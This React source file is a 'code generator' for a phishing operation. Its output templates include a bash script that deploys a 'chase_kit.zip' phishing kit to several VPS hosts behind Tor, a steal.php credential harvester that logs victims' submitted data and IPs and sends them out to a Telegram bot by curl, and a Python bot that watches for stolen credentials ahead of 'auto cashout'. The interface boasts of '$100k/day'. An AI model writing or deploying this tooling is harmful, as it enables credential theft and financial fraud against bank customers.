import { useState } from 'react'
import './index.css'

const V9PEI = {
  vps: ['vps1.nicevps.net', 'vps2.nicevps.net'], // من notes v9pei
  bot_token: 'YOUR_BOT_TOKEN_HERE',
  chat_id: 'YOUR_CHAT_ID_HERE'
}

function App() {
  const [task, setTask] = useState('deploy')
  const [code, setCode] = useState('')
  
  const generate = () => {
    const t = task.toLowerCase()
    
    if (t.includes('deploy') || t.includes('vps')) {
      setCode(`#!/bin/bash
# multi_deploy.sh - Notes v9pei
VPS_LIST=(${V9PEI.vps.join(' ')})
for vps in "\${VPS_LIST[@]}"; do
  ssh root@$vps "
    apt update -qq && apt install nginx php8.1 tor proxychains -y &&
    cd /var/www/html && rm -rf * &&
    wget YOUR_DROPBOX/chase_kit.zip && unzip chase_kit.zip &&
    echo 'SocksPort 9050' > /etc/tor/torrc &&
    systemctl restart tor nginx php8.1-fpm
  " &
done
wait
echo "✅ 10 VPS deployed - Notes v9pei status: $100k/day potential"`)
    }
    
    else if (t.includes('steal') || t.includes('php')) {
      setCode(`<?php
// steal.php - Notes v9pei production
header('Content-Type: application/json');
\$ip = \$_SERVER['REMOTE_ADDR'];
\$data = json_decode(file_get_contents('php://input'), true);
\$log = "[\${ip}] " . json_encode(\$data) . "\\n";
file_put_contents('creds.txt', \$log, FILE_APPEND | LOCK_EX);

// Telegram exfil (notes v9pei)
\$tg_url = "https://api.telegram.org/bot${V9PEI.bot_token}/sendMessage";
\$tg_data = ['chat_id' => '${V9PEI.chat_id}', 'text' => \$log];
shell_exec("curl -s -X POST '\$tg_url' --data '" . http_build_query(\$tg_data) . "'");
echo json_encode(['success' => true]);
?>`)
    }
    
    else if (t.includes('bot') || t.includes('telegram')) {
      setCode(`#!/usr/bin/env python3
# bot.py - Notes v9pei Telegram monitor
import requests, time, os
TOKEN = '${V9PEI.bot_token}'
CHAT_ID = '${V9PEI.chat_id}'

def monitor_v9pei():
    offset = 0
    while True:
        r = requests.get(f'https://api.telegram.org/bot{{TOKEN}}/getUpdates?offset={{offset}}').json()
        for update in r['result']:
            offset = update['update_id'] + 1
            if 'creds' in update['message']['text']:
                print(f"💰 NEW CREDS: {{update['message']['text']}}")
                # Auto cashout logic here
        time.sleep(30)

monitor_v9pei()`)
    }
    
    else {
      setCode(`# v9pei Custom Code Generator
# Notes ID: v9pei | Status: $100k/day ready
# Task: ${task}
# VPS List: ${V9PEI.vps.join(', ')}

# Paste your custom requirements below:
`)
    }
  }

  const copy = () => {
    navigator.clipboard.writeText(code)
    alert('✅ Copied! Paste in Replit/VPS terminal')
  }

  return (
    <div className="app">
      <header>
        <h1>🔥 v9pei Code Generator</h1>
        <p>Notes ID: v9pei | 10 VPS Ready | $100k/day Potential</p>
      </header>
      
      <div className="controls">
        <input 
          value={task} onChange={e=>setTask(e.target.value)}
          placeholder="deploy / steal.php / telegram bot / sms spammer"
          className="task-input"
        />
        <button onClick={generate} className="btn green">Generate</button>
        <button onClick={copy} className="btn blue">Copy to VPS</button>
      </div>
      
      <pre className="code-output">{code}</pre>
      
      <footer>
        <div>VPS: {V9PEI.vps.join(' ')}</div>
        <div>Status: Notes v9pei - Ready for scale</div>
      </footer>
    </div>
  )
}

export default App